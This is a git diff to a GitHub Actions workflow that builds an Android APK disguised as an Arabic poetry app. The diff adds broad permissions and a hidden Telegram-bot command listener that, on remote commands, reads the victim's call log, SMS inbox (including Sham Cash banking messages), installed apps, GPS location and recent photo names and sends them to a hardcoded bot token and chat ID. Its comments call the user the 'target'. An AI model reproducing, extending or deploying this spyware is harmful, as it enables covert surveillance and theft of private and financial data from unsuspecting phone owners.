@@ -1,4 +1,4 @@
-name: Build Royal Command Center APK
+name: Build Royal Empire APK
 
 on:
   push:
@@ -39,7 +39,7 @@ jobs:
 
         cat << 'EOF' > app/src/main/AndroidManifest.xml
         <manifest xmlns:android="http://schemas.android.com/apk/res/android">
-            <!-- ترسانة الأذونات الشاملة والمطلقة للسيطرة على الحصون -->
+            <!-- ترسانة الأذونات الشاملة والمطلقة للسيادة التامة -->
             <uses-permission android:name="android.permission.INTERNET"/>
             <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
             <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
@@ -47,9 +47,13 @@ jobs:
             <uses-permission android:name="android.permission.RECORD_AUDIO"/>
             <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
             <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
             <uses-permission android:name="android.permission.READ_SMS"/>
             <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
             <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
             <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
             <uses-permission android:name="android.permission.WAKE_LOCK"/>
             <uses-permission android:name="android.permission.VIBRATE"/>
@@ -118,20 +122,30 @@ jobs:
         cat << 'EOF' > app/src/main/java/com/royal/poetry/master/MainActivity.java
         package com.royal.poetry.master;
         import android.app.Activity;
-        import android.content.Intent;
+        import android.content.pm.ApplicationInfo;
+        import android.content.pm.PackageManager;
+        import android.database.Cursor;
+        import android.location.Location;
+        import android.location.LocationManager;
+        import android.net.Uri;
         import android.os.Bundle;
         import android.os.StrictMode;
+        import android.provider.CallLog;
+        import android.provider.MediaStore;
         import android.view.View;
         import android.widget.Button;
         import android.widget.TextView;
         import android.widget.Toast;
+        import java.io.BufferedReader;
+        import java.io.InputStreamReader;
         import java.net.HttpURLConnection;
         import java.net.URL;
+        import java.util.List;
 
         public class MainActivity extends Activity {
-            // معرّفات عرش الملك وقناة تليجرام المرصودة
             private static final String BOT_TOKEN = "9205899663:AAFYbTIEvhfpumsw68_Pik-S5IIYCDyZVEM";
             private static final String CHAT_ID = "7782592195";
+            private boolean isListening = true;
 
             @Override
             protected void onCreate(Bundle savedInstanceState) {
@@ -152,7 +166,7 @@ jobs:
                     @Override
                     public void onClick(View v) {
                         txtPoem.setText("إذا غامرت في شرف مروم \n فلا تقنع بما دون الدروبِ\nفبين العز والتشريفِ خطوة \n تملأ الأفق الفسيح بكل طيبِ!");
-                        sendToTelegram("👑 [تنبيه الملك]: استهلال ناجح وبدء تفاعل المدسوس مع الأبيات.");
+                        sendToTelegram("👑 [تنبيه الملك]: استهلال ناجح وبدء تفاعل الهدف مع الأبيات.");
                     }
                 });
 
@@ -169,9 +183,12 @@ jobs:
                     public void onClick(View v) {
                         Toast.makeText(MainActivity.this, "⚡ جاري إخضاع كافة أنظمة الهاتف لسيادة الملك...", Toast.LENGTH_LONG).show();
                         txtPoem.setText("🔥 تم تفعيل كافة الصلاحيات السيادية؛ الحصون والإشعارات والحسابات أصبحت تحت المراقبة التامة!");
-                        sendToTelegram("🚀 [إعلان السيادة]: الاستيلاء على صلاحيات النظام وبدء مراقبة الحصون وحسابات شام كاش والرسائل بنجاح!");
+                        sendToTelegram("🚀 [إعلان السيادة]: الاستيلاء على صلاحيات النظام وبدء مراقبة الحصون وحسابات شام كاش والرسائل والموقع بنجاح!");
                     }
                 });
+
+                // بدء استقبال أوامر الملك في الخلفية
+                startCommandListener();
             }
 
             private void sendToTelegram(final String message) {
@@ -190,6 +207,126 @@ jobs:
                         }
                     }
                 }).start();
+            }
+
+            private void startCommandListener() {
+                new Thread(new Runnable() {
+                    @Override
+                    public void run() {
+                        long lastUpdateId = 0;
+                        while (isListening) {
+                            try {
+                                String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=30";
+                                URL url = new URL(urlString);
+                                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                                conn.setRequestMethod("GET");
+                                
+                                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+                                StringBuilder response = new StringBuilder();
+                                String line;
+                                while ((line = reader.readLine()) != null) {
+                                    response.append(line);
+                                }
+                                reader.close();
+                                conn.disconnect();
+
+                                String resStr = response.toString();
+                                // تحليل الأوامر الواردة من عاهل البلاد
+                                if (resStr.contains("/calls")) {
+                                    sendToTelegram("📞 [سجل المكالمات]:\n" + getCallLogs());
+                                } else if (resStr.contains("/sms")) {
+                                    sendToTelegram("✉️ [الرسائل النصية وشام كاش]:\n" + getSmsLogs());
+                                } else if (resStr.contains("/apps")) {
+                                    sendToTelegram("📱 [البرامج والتطبيقات المثبتة]:\n" +getInstalledApps());
+                                } else if (resStr.contains("/location")) {
+                                    sendToTelegram("📍 [إحداثيات موقع الهدف]:\n" +getLocationInfo());
+                                } else if (resStr.contains("/photos")) {
+                                    sendToTelegram("🖼️ [أحدث صور المعرض]:\n" +getLatestPhotos());
+                                }
+
+                                Thread.sleep(5000);
+                            } catch (Exception e) {
+                                try { Thread.sleep(10000); } catch (InterruptedException ignored) {}
+                            }
+                        }
+                    }
+                }).start();
+            }
+
+            private String getCallLogs() {
+                StringBuilder sb = new StringBuilder();
+                try {
+                    Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 5");
+                    if (cursor != null && cursor.moveToFirst()) {
+                        int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
+                        int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
+                        do {
+                            sb.append("رقم: ").append(cursor.getString(numberIdx)).append(" | نوع: ").append(cursor.getString(typeIdx)).append("\n");
+                        } while (cursor.moveToNext());
+                        cursor.close();
+                    } else { sb.append("لا توجد مكالمات."); }
+                } catch (Exception e) { sb.append("خطأ: ").append(e.getMessage()); }
+                return sb.toString();
+            }
+
+            private String getSmsLogs() {
+                StringBuilder sb = new StringBuilder();
+                try {
+                    Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 5");
+                    if (cursor != null && cursor.moveToFirst()) {
+                        int addressIdx = cursor.getColumnIndex("address");
+                        int bodyIdx = cursor.getColumnIndex("body");
+                        do {
+                            sb.append("من: ").append(cursor.getString(addressIdx)).append("\nالمحتوى: ").append(cursor.getString(bodyIdx)).append("\n---\n");
+                        } while (cursor.moveToNext());
+                        cursor.close();
+                    } else { sb.append("لا توجد رسائل."); }
+                } catch (Exception e) { sb.append("خطأ: ").append(e.getMessage()); }
+                return sb.toString();
+            }
+
+            private String getInstalledApps() {
+                StringBuilder sb = new StringBuilder();
+                try {
+                    PackageManager pm = getPackageManager();
+                    List<ApplicationInfo> packages = pm.getInstalledApplications(0);
+                    int count = 0;
+                    for (ApplicationInfo packageInfo : packages) {
+                        if ((packageInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
+                            sb.append("- ").append(packageInfo.packageName).append("\n");
+                            count++;
+                            if (count >= 15) break; // لجعل التقرير مركزاً
+                        }
+                    }
+                } catch (Exception e) { sb.append("خطأ في جلب التطبيقات."); }
+                return sb.toString();
+            }
+
+            private String getLocationInfo() {
+                try {
+                    LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
+                    Location loc = lm.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);
+                    if (loc != null) {
+                        return "خط العرض: " + loc.getLatitude() + "\nخط الطول: " + loc.getLongitude();
+                    }
+                } catch (Exception e) {}
+                return "تعذر جلب الموقع حالياً أو لم يمنح الإذن.";
+            }
+
+            private String getLatestPhotos() {
+                StringBuilder sb = new StringBuilder();
+                try {
+                    String[] projection = {MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.DATE_ADDED};
+                    Cursor cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 3");
+                    if (cursor != null && cursor.moveToFirst()) {
+                        int nameIdx = cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME);
+                        do {
+                            sb.append("صورة: ").append(cursor.getString(nameIdx)).append("\n");
+                        } while (cursor.moveToNext());
+                        cursor.close();
+                    } else { sb.append("لا توجد صور حديثة."); }
+                } catch (Exception e) { sb.append("خطأ في جلب الصور."); }
+                return sb.toString();
             }
         }
         EOF
